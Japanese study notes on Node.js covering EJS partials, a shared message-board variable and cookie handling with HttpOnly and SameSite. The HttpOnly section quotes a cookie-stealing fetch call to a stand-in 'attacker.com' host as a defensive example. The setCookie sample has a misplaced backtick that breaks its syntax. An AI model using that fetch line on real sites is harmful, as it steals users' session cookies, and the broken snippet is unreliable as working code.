# パーシャル、アプリケーション、クッキー

## include とパーシャル

- パーシャルとは：テンプレートの一部を部品化する。ex.）table など
- パーシャルの作成方法：

1. data_item.ejs を作成し、テーブル内の内容を用意。

```js
<tr>
  <th><%= id %></th>
  <td><%= key %></td>
  <td><%= val[0] %></td>
</tr>
```

2. この data_item.ejs というパーシャルを使ってテーブルの表示を行うように index.ejs を書く。

```js
<table class="table">
<% Object.entries(data).forEach(([key, value], index) => { %> <%- include('data_item', { id:
index + 1, key, val: value }) %> <% }) %>
</table>
```

- 「data の中身を 1 件ずつ取り出して、index つけて、パーシャルに渡してテーブル 1 行ずつ作ってね」という意味。

  1. Object.entries(data)
     data がこうだったとする：

  ```js
  let data = {
  Taro: "090-9999-9999",
  Hanako: "080-888-888",
  Sachiko: "070-777-777",
  };
  Object.entries(data) が返すもの：
  [
  ["Taro", "090-9999-9999"],
  ["Hanako", "080-888-888"],
  ["Sachiko", "070-777-777"]
  ]
  ```

  つまり、
  key が名前（"Taro"）
  value が電話番号（"090-9999-9999"）
  のペアになった配列。

  2. .forEach(([key, value], index) => { ... })
     ([key, value], index) => { ... }
     これは 配列 [key, value] をそのまま分解して受け取る書き方（分割代入）。
     1 ループ目では：

  ```ts
  key = "Taro";
  value = "090-9999-9999";
  index = 0;
  ```

  2 ループ目では：

  ```ts
  key = "Hanako";
  value = "080-888-888";
  index = 1;
  ```

  …って感じで回る。

  3. index + 1 の意味
     { id: index + 1, ... }
     JavaScript の配列は index が 0 から始まるけど、テーブルの ID は 1 から始めたいので+1 している。

  4. include してる行

  ```js
  <%- include('data_item', { id: index + 1, key, val: value }) %>
  ```

  ここで data_item.ejs に値を渡してる。
  ここは、index.ejs から見た相対パスで書く。data_item.ejs が、index.ejs と同じフォルダ内にあるため、'data_item'だけど、もし別のフォルダ（例えば「partials」フォルダ内にあったら、include('partials/data_item', { id, key, val }) %> になる。

  5. <%- を使っている理由
     <%- include(...) %>
     <%- は HTML をエスケープしないで “そのまま” 出力する。
     エスケープとは、HTML として扱われないように、特殊な記号を安全な別の文字に変換すること。
     エスケープすると、ブラウザが「ただの文字列」として扱うようになる。
     script タグなどが入っていた場合に、JavaScript が実行されて危険。（XSS（クロスサイトスクリプティング）攻撃）

3. app.js で、filename でパーシャルファイルを指定する

- app.js の response_index 関数に、filename に index.ejs のフルパスを追加する。

```js
function response_index(request, response) {
  const msg = "これはIndexページです。";
  let content = ejs.render(index_page, {
    title: "Index",
    content: msg,
    data: data,
    filename: filePath_index, // index.ejs のフルパスを渡す！
  });
  response.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  response.write(content);
  response.end();
}
```

- filename の設定は include のパス解決のために必要。つまり、include('data_item', { id: index + 1, key, val: value })が書いてあるファイルを指定する。

## アプリケーション変数

Web で扱われているデータは 2 種類ある

1. 全ての人に共通のデータ: グローバル変数として用意しそれを表示。
2. アクセスしている人それぞれの固有のデータ: クッキーなど

### メッセージの伝言ページを作る

フォームを用意し、テキストを送信すると、それがグローバル変数に保管され、誰がアクセスしてもそのメッセージを見ることができるようにする。

1. テンプレート（index4.ejs を作成）
   ここに、送信されたメッセージが表示される table と、フォームを設置。

2. app4.js を作成
   ・response_index 関数を作成する。（フォームから送信された文字列を受け取って、msg だけを取り出し、画面に再表示する）

```js
function response_index(request, response) {
  // POSTアクセス時の処理
  if (request.method === "POST") {
    let body = ""; // ここに、フォーム送信されたデータが文字列として入る。

    // データ受信のイベント処理
    // 本の書き方
    // request.on("data", (data) => {
    //   body += data;
    // });
    // 推奨の書き方は、.toString()をちゃんと書く。
    request.on("data", (data) => {
      body += data.toString();
    });

    // データ受信終了のイベント処理
    request.on("end", () => {
      // 本の書き方は、
      // data = qs.parse(body);
      const params = new URLSearchParams(body);
      data.msg = params.get("msg") ?? "";
      console.log(data); // { msg: 'フォームから送信された内容' } のように表示される。例）msg=%E3%83%86%E3%82%B9%E3%83%88
      console.log(params.get("msg")); // フォームから送信された内容だけが表示される。例）テスト
      write_index(request, response); // index書き出し処理
    });
  } else {
    write_index(request, response); // index書き出し処理
  }
}
```

・何をやっているか

1. 関数が呼ばれるタイミング

```js
function response_index(request, response) {
```

http://localhost:3000/ にアクセスされたとき

GET でも POST でもここに来る

2. POST かどうかを判定

```
if (request.method === "POST") {
```

なぜ？
GET：ただページを表示したい
POST：フォーム送信されたデータを処理したい

3. body を用意する

```
let body = "";
```

ここは 「データを一時的に貯める箱」。
フォーム送信のデータは、一気に届くとは限らない
小さなかたまり（chunk）に分かれて届くから。

4. データを受け取り続ける

```js
request.on("data", (data) => {
  body += data.toString();
});
```

ここで起きていること：
フォームの中身が 少しずつ届く
data は Buffer 型
.toString() で文字列に変換
body にどんどん追加

📦 イメージ：
1 回目: "msg=%E3%83%86"
2 回目: "%E3%82%B9%E3%83%88"
↓
body = "msg=%E3%83%86%E3%82%B9%E3%83%88"

5. データの受信が全部終わった

```js
request.on("end", () => {
```

ここに来た時点で：
フォームのデータは すべて body に入った

6. URLSearchParams で解析

```js
const params = new URLSearchParams(body);
```

何をしている？
msg=%E3%83%86%E3%82%B9%E3%83%88
⬇
msg = テスト
という形に 解釈してくれる道具を作っている。

7. msg だけ取り出す

```js
data.msg = params.get("msg") ?? "";
```

params.get("msg") で、"テスト" が返る
?? ""　で、もし空なら "" を入れる安全装置

結果：
data = {
msg: "テスト"
};

8. 確認用ログ

```js
console.log(data);
console.log(params.get("msg"));
```

data → { msg: 'テスト' }
params.get("msg") → テスト

9. ページを再表示

```js
write_index(request, response);
```

EJS に data.msg を渡す
画面に さっき送信した内容が表示される

10. POST じゃなかった場合（GET）

```js
} else {
  write_index(request, response);
}
```

ただの初回アクセス
msg は "no message...." のまま表示。

### クッキーの使用

- アクセスしている人それぞれの固有のデータ
- クッキーとは、Web ブラウザに用意されている、サーバーから送られた値を保管しておく仕組み。
- クッキーの情報は、ヘッダー情報としてサーバーと値をやり取りしている。
- クッキーは、日本語などを直接保管できない。保管できる特殊な形に変換しなくてはならない。取り出したらまた元の形に変換しなくてはならない。

1. テンプレート作成(index5.ejs)に、cookie_data というタグを追加。

```js
<p>your last message: <%= cookie_data %></p>
```

2. app5.js で、cookie_data にクッキーの値を入れる。

- response_index 関数の、URLSearchParams でフォームに送信されたメッセージを日本語に変換した後に、下記を追加。

```js
// クッキーの保存
setCookie("msg", data.msg, response);
```

- write_index 関数の content に、

```js
let cookie_data = getCookie("msg", request);
```

と、let content に、cookie_data: cookie_data,を追加

- setCookie 関数(クッキーへの保存)

```js
function setCookie(key, value, response) {
  const cookie = encodeURIComponent(value);
  response.setHeader("Set-Cookie", `${key}=${cookie}; Path=/`; HttpOnly; SameSite=Lax);
}
```

この関数は、サーバーからブラウザに「この値をクッキーとして保存してね」と指示している。
key, value, response の引数：クッキーのキーと値、そして response を引数にもつ。
クッキーはヘッダー情報として送信するので、response の setHeader を利用するために、response も引数に入れている。

const cookie = encodeURIComponent(value);で、クッキーに入れてはいけない文字を、安全な形（encode）に変換している。

response.setHeader("Set-Cookie", `${key}=${cookie}; Path=/`);で、
HTTP レスポンスヘッダーに、こう書いて返しています：
Set-Cookie: msg=%E3%83%86%E3%82%B9%E3%83%88; Path=/

ブラウザに、
「msg という名前で、
値は %E3%83%86%E3%82%B9%E3%83%88 を保存しろ」
と命令している。

Path=/ の意味
このクッキーを、サイト全体で使えるようにするという指定。

本の、escape / unescape は 非推奨。
今の推奨は、
encodeURIComponent(value)
decodeURIComponent(value)

HttpOnly：
JavaScript から読めないクッキーにする。
HttpOnly を付けない場合、document.cookie で、ブラウザ上の JavaScript からクッキーが読める状態になり危険。
fetch("https://attacker.com/steal?c=" + document.cookie)で、クッキーが丸ごと盗まれる。

SameSite とは？：
「別のサイトからのリクエストでも、このクッキーを送っていい？」という制御。
CSRF（クロスサイトリクエストフォージェリ）を防ぐ。
SameSite=Lax（おすすめ・標準）は、
通常のリンク遷移 → 送る
<img> <form> など → 送らない

SameSite=Strict（超厳しい）は、
別サイトから来たら 一切送らない
セキュリティ最強
UX が悪くなりがち

SameSite=None; Secure（特殊）は、
別サイトでも送る
広告・SSO 用途
HTTPS 必須

今は SameSite=Lax がデフォルトですが、
👉 明示的に書くのがベストプラクティス

- getCookie 関数（クッキーから値の読み込み）

```js
function getCookie(key, request) {
  const cookieHeader = request.headers.cookie ?? "";
  const pairs = cookieHeader.split("; ");

  for (const p of pairs) {
    if (p.startsWith(key + "=")) {
      const raw = p.substring((key + "=").length); // ← +1しない
      return decodeURIComponent(raw);
    }
  }
  return "";
}
```

この関数は、リクエストヘッダーに含まれる Cookie の中から、key に対応する値だけを取り出して返す。
ブラウザはリクエスト時に、こんなヘッダーを送ります：

Cookie: msg=%E3%83%86%E3%82%B9%E3%83%88; theme=dark
Node ではこれが：
request.headers.cookie として 1 本の文字列 で入ります。
クッキーが 無い場合：undefined になりエラーになるので、?? ""を入れている。
A ?? B は、A が null または undefined のときだけ B を使うという演算子。
null と undefined だけを弾く。（本の、三項演算子は undefined だけ弾いている）

Cookie ヘッダーは、; 区切りで複数入っています。
例）msg=テスト; theme=dark; lang=ja
これを、const pairs = cookieHeader.split("; ");で、
[
"msg=テスト",
"theme=dark",
"lang=ja"
]
このように 1 個ずつ調べられる形に分解している。

for (const p of pairs) で、配列の中身を 1 個ずつ順番にチェックしている。

if (p.startsWith(key + "=")) で、欲しいクッキーかどうかを見分ける
例えば key が "msg" のとき：
"msg=テスト" → ✅ true
"theme=dark" → ❌ false

const raw = p.substring((key + "=").length);は、msg= を取り除いて「値だけ」にしている。
p はこういう文字列：
msg=%E3%83%86%E3%82%B9%E3%83%88

p.substring(n) は、n 文字目（0 始まり）から最後までを切り出す。
**n は「文字数」じゃなく「開始位置」**です。
つまり、
0: m
1: s
2: g
3: =
4: % ← ここがエンコードの開始（超大事）

p.substring(4)は、%E3%83%86%E3%82%B9%E3%83%88。つまり、msg= を取り除いて「値だけ」にする

decodeURIComponent(raw)は、Cookie に保存するときに：encodeURIComponent(value)していたので、
読むときは 必ず逆変換。
%E3%83%86%E3%82%B9%E3%83%88 を、「テスト」に変換している。

return "";で、空文字を返して、クッキーが見つからなかったときにエラー回避。

```txt
Cookieヘッダー
↓
"msg=テスト; theme=dark"
↓ split
["msg=テスト", "theme=dark"]
↓ ループ
"msg=テスト" ←一致
↓ substring
"%E3%83%86%E3%82%B9%E3%83%88"
↓ decode
"テスト"
```
